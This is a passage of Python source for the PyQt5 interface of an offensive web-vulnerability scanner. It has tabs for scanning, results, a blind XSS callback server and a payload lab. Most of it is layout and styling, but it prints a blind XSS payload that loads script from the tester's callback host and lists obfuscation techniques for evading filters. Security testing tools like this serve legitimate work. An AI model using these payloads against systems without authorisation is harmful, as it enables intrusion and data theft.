#!/usr/bin/env python3
import sys
import json
import os
import time
import random
import base64
import hashlib
import logging
import traceback
from PyQt5.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTabWidget, QGroupBox, QCheckBox, QComboBox, QSpinBox,
    QTextEdit, QListWidget, QTreeWidget, QTreeWidgetItem, QProgressBar,
    QFileDialog, QMessageBox, QApplication, QSplitter, QFrame, QGridLayout,
    QScrollArea, QSlider, QRadioButton, QButtonGroup, QMenu, QMenuBar,
    QStatusBar, QToolBar, QAction, QDialog, QDialogButtonBox, QFormLayout
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject, QTimer, QSize, QRect, QPropertyAnimation, QEasingCurve
from PyQt5.QtGui import QIcon, QFont, QColor, QPalette, QPainter, QLinearGradient, QPen, QBrush, QPixmap, QMovie
from core.scanner import Scanner
from core.report import ReportGenerator
from core.blind_xss import BlindXSSServer
from ui.styles import NeonStyles, CyberStyles, MatrixStyles
from ui.widgets import (
    GlitchLabel, NeonButton, RainbowBorder, ScanProgress, ConsoleOutput,
    AnimatedToggle, ParticleBackground, TypeWriter, GradientProgress,
    HoverSlider, GlowingLineEdit, CyberpunkSlider, MatrixRain, PulseButton,
    AnimatedCheckBox, RotatingIcon, NeonTabBar, FloatingWidget
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("CHOMBEZA.UI")

class ScannerThread(QObject):
    update_progress = pyqtSignal(int)
    update_log = pyqtSignal(str)
    scan_finished = pyqtSignal(dict)
    vulnerability_found = pyqtSignal(dict)
    update_status = pyqtSignal(str)

    def __init__(self, scanner):
        super().__init__()
        self.scanner = scanner
        self.running = False
        self._is_running = False

    def run_scan(self):
        """Run the scan in a separate thread"""
        self.running = True
        self._is_running = True
        try:
            self.scanner.start_scan()
            self.update_log.emit("⚡ Scan initialized... CHOMBEZA is hunting!")
            self.update_status.emit("Hunting for vulnerabilities...")

            while self._is_running and self.running:
                if self.scanner.scan_queue.qsize() == 0:
                    self._is_running = False
                    break
                progress = self.scanner.get_progress()
                self.update_progress.emit(int(progress))
                time.sleep(0.1)

            if self.running:  # Only generate report if not stopped
                self.scanner.stop_scan()
                report = self.scanner.generate_report()
                self.update_log.emit("✅ Scan completed! CHOMBEZA found prey!")
                self.scan_finished.emit(report)
                self.update_status.emit("Ready for next hunt")
        except Exception as e:
            self.update_log.emit(f"❌ Scan error: {str(e)}")
            logger.error(f"Scan thread error: {traceback.format_exc()}")

    def stop_scan(self):
        """Stop the scan safely"""
        self.running = False
        self._is_running = False
        if hasattr(self, 'scanner') and self.scanner:
            self.scanner.stop_scan()
        self.update_log.emit("🛑 Scan stopped by user")

class BlindXSSThread(QThread):
    callback_received = pyqtSignal(dict)

    def __init__(self, server):
        super().__init__()
        self.server = server
        self.running = False

    def run(self):
        """Run the blind XSS server"""
        self.running = True
        self.server.start()
        while self.running:
            try:
                callbacks = self.server.get_callbacks()
                if callbacks:
                    for cb in callbacks:
                        self.callback_received.emit(cb)
                    self.server.clear_callbacks()
                time.sleep(1)
            except Exception as e:
                logger.error(f"Blind XSS thread error: {e}")

    def stop(self):
        """Stop the blind XSS server safely"""
        self.running = False
        if hasattr(self, 'server') and self.server:
            self.server.stop()
        self.quit()
        self.wait(2000)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CHOMBEZA BUG BOUNTY PRO - Developed by archnexus707")
        self.setGeometry(100, 100, 1150, 720)
        self.setMinimumSize(950, 620)
        
        # Enable fullscreen toggle
        self.is_maximized = False
        
        # Set window flags for better resize handling
        self.setWindowFlags(Qt.Window | Qt.WindowCloseButtonHint | Qt.WindowMinMaxButtonsHint | Qt.WindowSystemMenuHint)
        
        # Load config
        self.config = self._load_config()
        self.scanner = Scanner(config_path='config.json' if os.path.exists('config.json') else None)
        self.blind_xss_server = BlindXSSServer(self.config.get("blind_xss_port", 5000))
        self.blind_xss_thread = BlindXSSThread(self.blind_xss_server)
        
        # Thread management
        self.scanner_thread = None
        self.scanner_worker = None
        self.scan_in_progress = False

        # Setup UI with responsive layout
        self._setup_ui()
        self._apply_theme()
        self._setup_connections()
        self._setup_animations()

        # Start blind XSS server
        self.blind_xss_thread.start()
        
        # Install event filter for resize events
        self.installEventFilter(self)

        # Live traffic window
        self.traffic_window = None
        self._setup_traffic_monitoring()

    def _load_config(self):
        """Load configuration from file"""
        if os.path.exists("config.json"):
            try:
                with open("config.json", 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Failed to load config: {e}")
                return {}
        return {}

    def _setup_ui(self):
        """Setup the user interface"""
        # Central widget with layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout with margins for better resize handling
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(8)
        central_widget.setLayout(main_layout)

        # Matrix rain background effect
        self.matrix_rain = MatrixRain(self)
        self.matrix_rain.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.matrix_rain.lower()
        
        # Particle background
        self.particle_bg = ParticleBackground(self)
        self.particle_bg.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.particle_bg.lower()

        # Header with animation
        header = QWidget()
        header.setFixedHeight(80)
        header_layout = QHBoxLayout()
        header_layout.setContentsMargins(20, 10, 20, 10)
        header.setLayout(header_layout)
        
        # Logo (emoji)
        self.logo_label = QLabel("🐞")
        self.logo_label.setAlignment(Qt.AlignCenter)
        self.logo_label.setFixedSize(64, 64)
        self.logo_label.setFont(QFont("Segoe UI Emoji", 32))
        self.logo_label.setStyleSheet("background: transparent;")
        header_layout.addWidget(self.logo_label)

        # Title with glitch effect
        self.title_label = GlitchLabel("CHOMBEZA BUG BOUNTY PRO")
        self.title_label.setFont(QFont("Courier New", 18, QFont.Bold))
        header_layout.addWidget(self.title_label)

        # Theme selector with animation
        self.theme_combo = QComboBox()
        self.theme_combo.addItems(["Neon Glow", "Cyberpunk", "Matrix", "Dark Mode", "Color Blind"])
        self.theme_combo.setFixedWidth(150)
        self.theme_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a;
                color: #00ff00;
                border: 2px solid #00ff00;
                padding: 5px;
                border-radius: 5px;
            }
            QComboBox:hover {
                background: #003300;
                border: 2px solid #00ff00;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox QAbstractItemView {
                background: #1a1a1a;
                color: #00ff00;
                selection-background-color: #003300;
            }
        """)
        header_layout.addWidget(self.theme_combo)

        # Fullscreen toggle button
        self.fullscreen_btn = PulseButton("⛶")
        self.fullscreen_btn.setFixedSize(40, 40)
        self.fullscreen_btn.clicked.connect(self.toggle_fullscreen)
        header_layout.addWidget(self.fullscreen_btn)

        main_layout.addWidget(header)

        # Rainbow border animation
        self.rainbow_border = RainbowBorder(self)
        self.rainbow_border.setFixedHeight(3)
        main_layout.addWidget(self.rainbow_border)

        # Tab widget with custom bar
        self.tab_bar = NeonTabBar()
        self.tabs = QTabWidget()
        self.tabs.setTabBar(self.tab_bar)
        self.tabs.setDocumentMode(True)
        self.tabs.setUsesScrollButtons(True)
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid #00ff00;
                border-radius: 5px;
                background: rgba(10, 10, 10, 0.9);
            }
        """)
        main_layout.addWidget(self.tabs)

        # Create tabs with scroll areas for resize handling
        self._setup_scan_tab()
        self._setup_results_tab()
        self._setup_blind_xss_tab()
        self._setup_payload_lab_tab()
        self._setup_settings_tab()

        # Console with animations
        console_container = QWidget()
        console_layout = QVBoxLayout()
        console_container.setLayout(console_layout)
        
        console_header = QHBoxLayout()
        console_label = QLabel("💻 CHOMBEZA CONSOLE")
        console_label.setFont(QFont("Courier New", 12, QFont.Bold))
        console_header.addWidget(console_label)
        
        self.clear_console_btn = QPushButton("🗑️ Clear")
        self.clear_console_btn.setFixedSize(80, 25)
        self.clear_console_btn.clicked.connect(self._clear_console)
        console_header.addWidget(self.clear_console_btn)
        
        console_layout.addLayout(console_header)
        
        self.console = ConsoleOutput()
        self.console.setMinimumHeight(150)
        self.console.setMaximumHeight(250)
        console_layout.addWidget(self.console)
        
        main_layout.addWidget(console_container)

        # Progress bar with animations
        progress_container = QWidget()
        progress_layout = QHBoxLayout()
        progress_container.setLayout(progress_layout)
        
        self.progress_label = QLabel("Scan Progress:")
        progress_layout.addWidget(self.progress_label)
        
        self.progress = GradientProgress()
        self.progress.setFixedHeight(20)
        progress_layout.addWidget(self.progress)
        
        main_layout.addWidget(progress_container)

        # Status bar with animations
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_label = TypeWriter("Ready to hunt... CHOMBEZA is waiting")
        self.status_bar.addWidget(self.status_label)
        
        # Status indicators
        self.blind_xss_indicator = QLabel("● Blind XSS: Active")
        self.blind_xss_indicator.setStyleSheet("color: #00ff00;")
        self.status_bar.addPermanentWidget(self.blind_xss_indicator)

    def _setup_scan_tab(self):
        """Setup the scan tab"""
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        
        container = QWidget()
        layout = QVBoxLayout()
        layout.setSpacing(15)
        container.setLayout(layout)

        # Target input with animation
        target_group = QGroupBox("🎯 TARGET")
        target_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #00ff00;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        target_layout = QVBoxLayout()

        self.target_input = GlowingLineEdit()
        self.target_input.setPlaceholderText("https://target.com")
        self.target_input.setMinimumHeight(40)
        target_layout.addWidget(self.target_input)

        scan_type_layout = QHBoxLayout()
        scan_type_layout.addWidget(QLabel("Scan Type:"))
        self.scan_type_combo = QComboBox()
        # FIXED: Store both display text and actual scan type
        self.scan_types = {
            "⚡ Quick Scan": "quick",
            "🔍 Deep Scan": "deep",
            "🚀 Stealth Scan": "stealth",
            "💥 Aggressive Scan": "aggressive"
        }
        self.scan_type_combo.addItems(self.scan_types.keys())
        self.scan_type_combo.setMinimumHeight(35)
        scan_type_layout.addWidget(self.scan_type_combo)
        target_layout.addLayout(scan_type_layout)

        target_group.setLayout(target_layout)
        layout.addWidget(target_group)

        # Vulnerability selection with categories
        vuln_group = QGroupBox("🔬 VULNERABILITY TYPES")
        vuln_layout = QVBoxLayout()

        # Categories
        categories = {
            "INJECTION": ["XSS", "SQLi", "SSTI", "LFI", "RCE", "XXE", "SQLi Blind", "NoSQLi", "LDAPi", "XPATHi"],
            "CONFIGURATION": ["JWT", "CORS", "CSP", "HTTP Smuggling", "Web Cache", "Open Redirect", "CRLF"],
            "ACCESS CONTROL": ["IDOR", "Privilege Escalation", "Broken Access", "Mass Assignment"],
            "API & MODERN": ["GraphQL", "WebSocket", "API Fuzzing", "gRPC", "Serverless"],
            "INFRASTRUCTURE": ["Subdomain Takeover", "Cloud Metadata", "DNS Rebinding", "Port Scanning"],
            "ADVANCED": ["Prototype Pollution", "Race Condition", "Deserialization", "Memory Corruption"]
        }

        self.vuln_checkboxes = {}
        for category, vulns in categories.items():
            cat_label = QLabel(f"⚡ {category}")
            cat_label.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 14px; margin-top: 10px;")
            vuln_layout.addWidget(cat_label)
            
            grid = QGridLayout()
            for i, vuln in enumerate(vulns):
                cb = AnimatedCheckBox(vuln)
                cb.setChecked(self.config.get("features", {}).get(vuln.lower().replace(" ", "_"), True))
                self.vuln_checkboxes[vuln] = cb
                grid.addWidget(cb, i // 4, i % 4)
            vuln_layout.addLayout(grid)

        vuln_group.setLayout(vuln_layout)
        layout.addWidget(vuln_group)

        # Scan controls
        control_group = QGroupBox("🎮 SCAN CONTROLS")
        control_layout = QGridLayout()

        control_layout.addWidget(QLabel("Threads:"), 0, 0)
        self.threads_spin = CyberpunkSlider()
        self.threads_spin.setRange(1, 50)
        self.threads_spin.setValue(self.config.get("threads", 10))
        control_layout.addWidget(self.threads_spin, 0, 1)

        control_layout.addWidget(QLabel("Delay (ms):"), 1, 0)
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 5000)
        self.delay_spin.setValue(self.config.get("delay", 100))
        control_layout.addWidget(self.delay_spin, 1, 1)

        control_layout.addWidget(QLabel("Timeout (s):"), 2, 0)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 60)
        self.timeout_spin.setValue(self.config.get("timeout", 10))
        control_layout.addWidget(self.timeout_spin, 2, 1)

        control_group.setLayout(control_layout)
        layout.addWidget(control_group)

        # Action buttons
        button_layout = QHBoxLayout()
        button_layout.setSpacing(20)
        
        self.scan_button = NeonButton("▶ START HUNT")
        self.scan_button.setMinimumHeight(50)
        self.scan_button.setFont(QFont("Courier New", 14, QFont.Bold))
        
        self.stop_button = NeonButton("⏹ STOP HUNT")
        self.stop_button.setMinimumHeight(50)
        self.stop_button.setFont(QFont("Courier New", 14, QFont.Bold))
        self.stop_button.setEnabled(False)
        
        self.pause_button = NeonButton("⏸ PAUSE")
        self.pause_button.setMinimumHeight(50)
        self.pause_button.setEnabled(False)
        
        button_layout.addWidget(self.scan_button)
        button_layout.addWidget(self.pause_button)
        button_layout.addWidget(self.stop_button)
        layout.addLayout(button_layout)

        scroll.setWidget(container)
        self.tabs.addTab(scroll, "🔍 HUNT")

    def _setup_results_tab(self):
        """Setup the results tab"""
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        
        container = QWidget()
        layout = QVBoxLayout()
        layout.setSpacing(10)
        container.setLayout(layout)

        # Stats dashboard
        stats_group = QGroupBox("📊 HUNT STATISTICS")
        stats_layout = QGridLayout()
        stats_layout.setHorizontalSpacing(10)
        stats_layout.setVerticalSpacing(10)
        stats_layout.setContentsMargins(10, 10, 10, 10)

        for _c in range(3):
            stats_layout.setColumnStretch(_c, 1)
        for _r in range(2):
            stats_layout.setRowStretch(_r, 1)

        self.stats_labels = {}
        stats_items = [
            ("Total", "total", "#00ff00"),
            ("Critical", "critical", "#ff0000"),
            ("High", "high", "#ff5e00"),
            ("Medium", "medium", "#ffbb00"),
            ("Low", "low", "#00a2ff"),
            ("Info", "info", "#888888")
        ]

        label_font = QFont("Courier New", 11, QFont.Bold)
        value_font = QFont("Courier New", 21, QFont.Bold)

        for i, (label, key, color) in enumerate(stats_items):
            frame = QFrame()
            frame.setFrameStyle(QFrame.Box)
            frame.setStyleSheet(f"""
                QFrame {{
                    border: 2px solid {color};
                    border-radius: 6px;
                    background: rgba(0, 0, 0, 0.60);
                }}
            """)
            frame.setMinimumHeight(92)
            frame.setMinimumWidth(205)

            vbox = QVBoxLayout()
            vbox.setContentsMargins(10, 8, 10, 8)
            vbox.setSpacing(4)

            label_widget = QLabel(label)
            label_widget.setAlignment(Qt.AlignCenter)
            label_widget.setFont(label_font)
            label_widget.setStyleSheet(f"color: {color};")
            vbox.addWidget(label_widget)

            value_widget = QLabel("0")
            value_widget.setAlignment(Qt.AlignCenter)
            value_widget.setFont(value_font)
            value_widget.setStyleSheet(f"color: {color};")
            value_widget.setMinimumHeight(30)
            self.stats_labels[key] = value_widget
            vbox.addWidget(value_widget)

            frame.setLayout(vbox)
            stats_layout.addWidget(frame, i // 3, i % 3)

        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)

        # Vulnerability tree with filtering
        tree_group = QGroupBox("🔍 VULNERABILITIES FOUND")
        tree_layout = QVBoxLayout()
        tree_layout.setSpacing(5)
        
        # Filter layout
        filter_layout = QHBoxLayout()
        filter_label = QLabel("Filter by severity:")
        filter_label.setStyleSheet("color: #00ff00;")
        filter_layout.addWidget(filter_label)
        
        self.severity_filter = QComboBox()
        self.severity_filter.addItems(["All", "Critical", "High", "Medium", "Low", "Info"])
        self.severity_filter.setMinimumWidth(120)
        self.severity_filter.setStyleSheet("""
            QComboBox {
                background: #1a1a1a;
                color: #00ff00;
                border: 2px solid #005500;
                padding: 5px;
                border-radius: 5px;
            }
            QComboBox:hover {
                border: 2px solid #00ff00;
            }
            QComboBox::drop-down {
                border: none;
            }
        """)
        filter_layout.addWidget(self.severity_filter)
        filter_layout.addStretch()
        tree_layout.addLayout(filter_layout)
        
        # Tree widget
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setHeaderLabels(["Severity", "Name", "URL", "Parameter", "Confidence"])
        self.vuln_tree.setColumnWidth(0, 100)
        self.vuln_tree.setColumnWidth(1, 200)
        self.vuln_tree.setColumnWidth(2, 300)
        self.vuln_tree.setColumnWidth(3, 150)
        self.vuln_tree.setColumnWidth(4, 100)
        self.vuln_tree.setAlternatingRowColors(True)
        self.vuln_tree.setMinimumHeight(200)
        self.vuln_tree.setStyleSheet("""
            QTreeWidget {
                background: #1a1a1a;
                color: #00ff00;
                border: 2px solid #005500;
                border-radius: 5px;
                outline: none;
            }
            QTreeWidget::item {
                padding: 5px;
                border-bottom: 1px solid #005500;
            }
            QTreeWidget::item:selected {
                background: #003300;
            }
            QTreeWidget::item:hover {
                background: #002200;
            }
            QHeaderView::section {
                background: #1a1a1a;
                color: #00ff00;
                padding: 5px;
                border: 1px solid #005500;
                font-weight: bold;
            }
        """)
        tree_layout.addWidget(self.vuln_tree)
        
        tree_group.setLayout(tree_layout)
        layout.addWidget(tree_group)

        # Vulnerability details
        details_group = QGroupBox("📝 VULNERABILITY DETAILS")
        details_layout = QVBoxLayout()
        
        self.vuln_details = QTextEdit()
        self.vuln_details.setReadOnly(True)
        self.vuln_details.setMinimumHeight(200)
        self.vuln_details.setStyleSheet("""
            QTextEdit {
                background: #1a1a1a;
                color: #00ff00;
                border: 2px solid #005500;
                border-radius: 5px;
                font-family: 'Courier New';
                padding: 5px;
            }
        """)
        details_layout.addWidget(self.vuln_details)
        
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)

        # Export buttons
        export_group = QGroupBox("📤 EXPORT REPORT")
        export_layout = QHBoxLayout()
        export_layout.setSpacing(10)
        
        export_formats = [
            ("HTML", "html", "#ff5e00"),
            ("CSV", "csv", "#00ff00"),
            ("JSON", "json", "#00a2ff"),
            ("PDF", "pdf", "#ff0000"),
            ("Markdown", "md", "#888888"),
            ("XML", "xml", "#ffbb00")
        ]
        
        for label, fmt, color in export_formats:
            btn = QPushButton(label)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background: #1a1a1a;
                    color: {color};
                    border: 2px solid {color};
                    padding: 8px 15px;
                    border-radius: 5px;
                    font-weight: bold;
                    min-width: 80px;
                }}
                QPushButton:hover {{
                    background: {color};
                    color: black;
                }}
                QPushButton:pressed {{
                    background: {color};
                    color: black;
                }}
            """)
            btn.clicked.connect(lambda checked, f=fmt: self._export_report(f))
            export_layout.addWidget(btn)
        
        export_group.setLayout(export_layout)
        layout.addWidget(export_group)

        # Add stretch to push everything up
        layout.addStretch()

        scroll.setWidget(container)
        self.tabs.addTab(scroll, "📊 RESULTS")

        # Connections
        self.vuln_tree.itemSelectionChanged.connect(self._show_vuln_details)
        self.severity_filter.currentTextChanged.connect(self._filter_vuln_tree)

    def _setup_blind_xss_tab(self):
        """Setup the blind XSS tab"""
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        container = QWidget()
        layout = QVBoxLayout()
        container.setLayout(layout)

        # Server status
        status_group = QGroupBox("🎯 BLIND XSS SERVER")
        status_layout = QVBoxLayout()

        self.blind_xss_label = QLabel("🟢 Blind XSS Server Running")
        self.blind_xss_label.setStyleSheet("color: #00ff00; font-size: 18px; font-weight: bold;")
        self.blind_xss_label.setAlignment(Qt.AlignCenter)
        status_layout.addWidget(self.blind_xss_label)

        # Server info
        info_layout = QGridLayout()
        
        self.blind_xss_url = QLabel(f"http://<your-ip>:{self.config.get('blind_xss_port', 5000)}/xss")
        self.blind_xss_url.setStyleSheet("color: #00a2ff; font-family: 'Courier New'; font-size: 14px;")
        self.blind_xss_url.setTextInteractionFlags(Qt.TextSelectableByMouse)
        info_layout.addWidget(QLabel("Callback URL:"), 0, 0)
        info_layout.addWidget(self.blind_xss_url, 0, 1)

        self.blind_xss_payload = QLabel(f"<script src=http://<your-ip>:{self.config.get('blind_xss_port', 5000)}/xss></script>")
        self.blind_xss_payload.setStyleSheet("color: #ff5e00; font-family: 'Courier New'; font-size: 14px;")
        self.blind_xss_payload.setTextInteractionFlags(Qt.TextSelectableByMouse)
        info_layout.addWidget(QLabel("Payload:"), 1, 0)
        info_layout.addWidget(self.blind_xss_payload, 1, 1)

        status_layout.addLayout(info_layout)

        # Control buttons
        control_layout = QHBoxLayout()
        self.restart_xss_btn = NeonButton("🔄 Restart Server")
        self.restart_xss_btn.clicked.connect(self._restart_blind_xss)
        control_layout.addWidget(self.restart_xss_btn)
        
        self.clear_xss_btn = NeonButton("🗑️ Clear Callbacks")
        self.clear_xss_btn.clicked.connect(self._clear_blind_xss)
        control_layout.addWidget(self.clear_xss_btn)
        status_layout.addLayout(control_layout)

        status_group.setLayout(status_layout)
        layout.addWidget(status_group)

        # Callbacks list
        callbacks_group = QGroupBox("📥 CALLBACKS RECEIVED")
        callbacks_layout = QVBoxLayout()

        self.blind_xss_list = QListWidget()
        self.blind_xss_list.setStyleSheet("""
            QListWidget {
                background: #1a1a1a;
                color: #00ff00;
                border: 2px solid #005500;
                font-family: 'Courier New';
            }
            QListWidget::item {
                padding: 5px;
                border-bottom: 1px solid #005500;
            }
            QListWidget::item:selected {
                background: #003300;
            }
        """)
        self.blind_xss_list.itemClicked.connect(self._show_blind_xss_details)
        callbacks_layout.addWidget(self.blind_xss_list)

        callbacks_group.setLayout(callbacks_layout)
        layout.addWidget(callbacks_group)

        # Callback details
        details_group = QGroupBox("🔍 CALLBACK DETAILS")
        details_layout = QVBoxLayout()

        self.blind_xss_details = QTextEdit()
        self.blind_xss_details.setReadOnly(True)
        self.blind_xss_details.setMinimumHeight(200)
        details_layout.addWidget(self.blind_xss_details)

        details_group.setLayout(details_layout)
        layout.addWidget(details_group)

        scroll.setWidget(container)
        self.tabs.addTab(scroll, "🎯 BLIND XSS")

    def _setup_payload_lab_tab(self):
        """Setup the payload lab tab with clear button"""
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        container = QWidget()
        layout = QVBoxLayout()
        container.setLayout(layout)

        # Payload generator
        generator_group = QGroupBox("🧪 PAYLOAD LABORATORY")
        generator_layout = QVBoxLayout()

        # Payload type
        type_layout = QHBoxLayout()
        type_layout.addWidget(QLabel("Payload Type:"))
        self.payload_type_combo = QComboBox()
        payload_types = [
            "XSS", "SQLi", "SSTI", "LFI", "RCE", "XXE", "SSRF", "JWT",
            "Open Redirect", "CRLF", "Prototype Pollution", "Deserialization",
            "LDAP Injection", "NoSQLi", "XPath Injection", "Command Injection"
        ]
        self.payload_type_combo.addItems(payload_types)
        type_layout.addWidget(self.payload_type_combo)
        generator_layout.addLayout(type_layout)

        # Obfuscation options
        obfuscation_group = QGroupBox("🔄 OBFUSCATION TECHNIQUES")
        obfuscation_layout = QGridLayout()

        self.obfuscation_options = {}
        techniques = [
            ("Base64 Encoding", "base64"),
            ("Hex Encoding", "hex"),
            ("Unicode Escaping", "unicode"),
            ("HTML Entities", "html"),
            ("URL Encoding", "url"),
            ("Double URL Encoding", "double_url"),
            ("JSFuck", "jsfuck"),
            ("String.fromCharCode", "fromcharcode"),
            ("Eval Wrapping", "eval"),
            ("Function Constructor", "function"),
            ("Mixed Case", "mixed_case"),
            ("Comment Injection", "comments"),
            ("Null Bytes", "nullbytes"),
            ("Line Breaks", "linebreaks"),
            ("Tab Injection", "tabs")
        ]

        for i, (label, key) in enumerate(techniques):
            cb = AnimatedCheckBox(label)
            self.obfuscation_options[key] = cb
            obfuscation_layout.addWidget(cb, i // 3, i % 3)

        obfuscation_group.setLayout(obfuscation_layout)
        generator_layout.addWidget(obfuscation_group)

        # Encryption options
        encryption_group = QGroupBox("🔐 ENCRYPTION LAYERS")
        encryption_layout = QGridLayout()

        self.encryption_options = {}
        encryption_techs = [
            ("AES-256", "aes"),
            ("RSA", "rsa"),
            ("RC4", "rc4"),
            ("Blowfish", "blowfish"),
            ("Custom XOR", "xor"),
            ("ROT13", "rot13"),
            ("Caesar Cipher", "caesar"),
            ("Base64 + XOR", "base64_xor")
        ]

        for i, (label, key) in enumerate(encryption_techs):
            rb = QRadioButton(label)
            self.encryption_options[key] = rb
            encryption_layout.addWidget(rb, i // 2, i % 2)

        encryption_group.setLayout(encryption_layout)
        generator_layout.addWidget(encryption_group)

        # Generate button
        self.generate_payload_btn = NeonButton("🎲 GENERATE PAYLOAD")
        self.generate_payload_btn.clicked.connect(self._generate_payload)
        generator_layout.addWidget(self.generate_payload_btn)

        # Generated payloads
        payload_group = QGroupBox("📋 GENERATED PAYLOADS")
        payload_layout = QVBoxLayout()

        self.payload_list = QListWidget()
        self.payload_list.setStyleSheet("""
            QListWidget {
                background: #1a1a1a;
                color: #00ff00;
                font-family: 'Courier New';
                font-size: 12px;
                max-height: 300px;
            }
            QListWidget::item {
                padding: 8px;
                border-bottom: 1px solid #005500;
            }
            QListWidget::item:selected {
                background: #003300;
            }
        """)
        
        # Payload lab performance optimizations
        self.payload_list.setBatchSize(50)
        self.payload_list.setUniformItemSizes(True)
        self.payload_list.setLayoutMode(QListWidget.Batched)
        
        payload_layout.addWidget(self.payload_list)

        # Payload action buttons
        payload_buttons = QHBoxLayout()
        
        self.copy_payload_btn = QPushButton("📋 Copy")
        self.copy_payload_btn.clicked.connect(self._copy_payload)
        payload_buttons.addWidget(self.copy_payload_btn)

        self.test_payload_btn = QPushButton("🎯 Test in Current Scan")
        self.test_payload_btn.clicked.connect(self._test_payload)
        payload_buttons.addWidget(self.test_payload_btn)

        self.save_payload_btn = QPushButton("💾 Save to Database")
        self.save_payload_btn.clicked.connect(self._save_payload)
        payload_buttons.addWidget(self.save_payload_btn)

        # NEW: Clear Payloads Button
        self.clear_payloads_btn = QPushButton("🗑️ Clear All")
        self.clear_payloads_btn.setStyleSheet("""
            QPushButton {
                background: #dc3545;
                color: white;
                border: 2px solid #dc3545;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #c82333;
                border: 2px solid #bd2130;
            }
        """)
        self.clear_payloads_btn.clicked.connect(self._clear_payloads)
        payload_buttons.addWidget(self.clear_payloads_btn)

        payload_layout.addLayout(payload_buttons)

        # Payload count label
        self.payload_count_label = QLabel("Total Payloads: 0")
        self.payload_count_label.setStyleSheet("color: #00ff00; font-size: 12px; padding: 5px;")
        payload_layout.addWidget(self.payload_count_label)

        payload_group.setLayout(payload_layout)
        generator_layout.addWidget(payload_group)

        generator_group.setLayout(generator_layout)
        layout.addWidget(generator_group)

        scroll.setWidget(container)
        self.tabs.addTab(scroll, "🧪 PAYLOAD LAB")

    def _setup_settings_tab(self):
        """Setup the settings tab"""
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        container = QWidget()
        layout = QVBoxLayout()
        container.setLayout(layout)

        # General settings
        general_group = QGroupBox("⚙️ GENERAL SETTINGS")
        general_layout = QFormLayout()

        self.concurrency_spin = QSpinBox()
        self.concurrency_spin.setRange(1, 100)
        self.concurrency_spin.setValue(self.config.get("concurrency", 10))
        general_layout.addRow("Concurrency:", self.concurrency_spin)

        self.rate_spin = QSpinBox()
        self.rate_spin.setRange(1, 1000)
        self.rate_spin.setValue(self.config.get("rate_limit", 100))
        general_layout.addRow("Rate Limit (req/sec):", self.rate_spin)

        self.proxy_input = QLineEdit()
        self.proxy_input.setText(self.config.get("proxy", ""))
        self.proxy_input.setPlaceholderText("http://127.0.0.1:8080")
        general_layout.addRow("Proxy:", self.proxy_input)

        self.user_agent_input = QLineEdit()
        self.user_agent_input.setText(self.config.get("user_agent", "CHOMBEZA-Bug-Bounty-Pro"))
        general_layout.addRow("User-Agent:", self.user_agent_input)

        general_group.setLayout(general_layout)
        layout.addWidget(general_group)

        # Advanced settings
        advanced_group = QGroupBox("🔧 ADVANCED SETTINGS")
        advanced_layout = QFormLayout()

        self.timeout_spin_adv = QSpinBox()
        self.timeout_spin_adv.setRange(1, 300)
        self.timeout_spin_adv.setValue(self.config.get("timeout", 30))
        advanced_layout.addRow("Timeout (seconds):", self.timeout_spin_adv)

        self.retries_spin = QSpinBox()
        self.retries_spin.setRange(0, 10)
        self.retries_spin.setValue(self.config.get("retries", 3))
        advanced_layout.addRow("Retries:", self.retries_spin)

        self.max_redirects = QSpinBox()
        self.max_redirects.setRange(0, 20)
        self.max_redirects.setValue(self.config.get("max_redirects", 5))
        advanced_layout.addRow("Max Redirects:", self.max_redirects)

        self.follow_redirects = AnimatedCheckBox("Follow Redirects")
        self.follow_redirects.setChecked(self.config.get("follow_redirects", True))
        advanced_layout.addRow("", self.follow_redirects)

        self.verify_ssl = AnimatedCheckBox("Verify SSL")
        self.verify_ssl.setChecked(self.config.get("verify_ssl", True))
        advanced_layout.addRow("", self.verify_ssl)

        advanced_group.setLayout(advanced_layout)
        layout.addWidget(advanced_group)

        # Features
        features_group = QGroupBox("🎯 FEATURES")
        features_layout = QVBoxLayout()

        self.auto_save_cb = AnimatedCheckBox("Auto-save scan progress")
        self.auto_save_cb.setChecked(self.config.get("auto_save", True))
        features_layout.addWidget(self.auto_save_cb)

        self.screenshot_cb = AnimatedCheckBox("Capture screenshots of vulnerabilities")
        self.screenshot_cb.setChecked(self.config.get("screenshot", True))
        features_layout.addWidget(self.screenshot_cb)

        self.smart_fuzz_cb = AnimatedCheckBox("Smart fuzzing (AI-powered)")
        self.smart_fuzz_cb.setChecked(self.config.get("smart_fuzz", False))
